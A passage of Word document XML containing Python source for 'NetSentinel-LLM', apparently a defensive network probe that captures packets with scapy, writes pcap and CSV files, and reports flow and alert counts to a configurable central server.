          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                print(f"[探针] 本轮上报异常：{exc}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8BFE29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CB46B20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 主循环</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6AFB89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="605B3935">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def run(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60975675">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        from scapy.all import sniff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B78730">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        from scapy.utils import PcapWriter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E06146A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0259A523">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if self.args.pcap:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7E2412">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            Path(self.args.pcap).parent.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DDAEDF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._pcap_writer = PcapWriter(self.args.pcap, append=True, sync=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4735B1F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17F60618">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flusher = threading.Thread(target=self._flush_loop, daemon=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706002EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flusher.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A8D3E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3FAF02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"[探针] 开始抓包 iface={self.args.iface or 'auto'} 窗口 {self.args.window}s "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E22C71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"上报={'否（--dry-run）' if self.args.dry_run else self.args.center}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAD2F4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535E438D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCA3A9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF1A2ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sniff(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AD6B87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                iface=self.args.iface,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36875B4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                filter=self.args.bpf or None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF2376F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                prn=self.handle,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC19352">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                store=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304D1D6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                stop_filter=lambda _: not self.running.is_set(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40667D36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689A25E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        except KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A462BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258D08AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        except PermissionError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5415D7C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit("抓包需要 root 或 CAP_NET_RAW 权限")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1BAE2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06639A48">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.running.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021CA1A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            time.sleep(self.args.window + 0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E10107C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flush(time.time())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47192432">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self._pcap_writer:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355ED633">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self._pcap_writer.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2809342D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self._csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AB3A73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self._csv.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407EED73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self.reporter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317F1DF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.reporter.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8E7E95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C245A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"[探针] 结束：抓包 {self.packets} 个，上报流 {self.flows_sent} 条，"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA2036D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"告警 {self.alerts} 条，流表淘汰 {self.table.dropped} 条",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607C7D5E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E86FFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2004A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E3DF18B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71B16C83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def build_parser() -&gt; argparse.ArgumentParser:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA680B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="NetSentinel-LLM 边缘探针")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC5571E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--iface", default=None, help="网卡名；不给则自动挑")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3635FB22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--center", default="http://127.0.0.1:8000")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C9BC59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--token", default=None, help="不传则读 NETSENTINEL_TOKEN 环境变量")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5C92E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--probe-id", default=socket.gethostname())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224A525B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--bpf", default="", help="BPF 过滤表达式")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324BDB31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--window", type=float, default=2.0, help="上报周期（秒）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02046352">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--max-flows", type=int, default=5000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262CFE96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--max-age", type=float, default=30.0, help="单条流最长存活秒数，超过即截断上报")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB8DDFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
